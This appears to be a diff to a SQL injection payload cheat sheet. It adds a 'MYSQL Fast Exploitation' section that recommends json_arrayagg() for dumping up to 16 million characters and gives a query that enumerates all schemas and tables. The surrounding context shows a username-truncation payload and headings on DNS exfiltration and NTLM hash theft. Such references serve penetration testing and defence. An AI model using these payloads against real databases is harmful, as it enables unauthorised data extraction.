@@ -28,6 +28,7 @@
     * [Into dumpfile method](#into-dumpfile-method)
 * [MYSQL UDF command execution](#mysql-udf-command-execution)
 * [MYSQL Truncation](#mysql-truncation)
+* [MYSQL Fast Exploitation](#mysql-fast-exploitation)
 * [MYSQL Out of band](#mysql-out-of-band)
     * [DNS exfiltration](#dns-exfiltration)
     * [UNC Path - NTLM hash stealing](#unc-path---ntlm-hash-stealing)
@@ -420,6 +421,18 @@ In MYSQL "`admin `" and "`admin`" are the same. If the username column in the da
 ```
 
 Payload: `username = "admin               a"`
+
+## MYSQL Fast Exploitation
+
+Requirement: `MySQL >= 5.7.22`
+
+Use `json_arrayagg()` instead of `group_concat()` which allows less symbols to be displayed
+* group_concat() = 1024 symbols
+* json_arrayagg() > 16,000,000 symbols
+
+```sql
+SELECT json_arrayagg(concat_ws(0x3a,table_schema,table_name)) from INFORMATION_SCHEMA.TABLES;
+```
 
 ## MYSQL UDF command execution
 
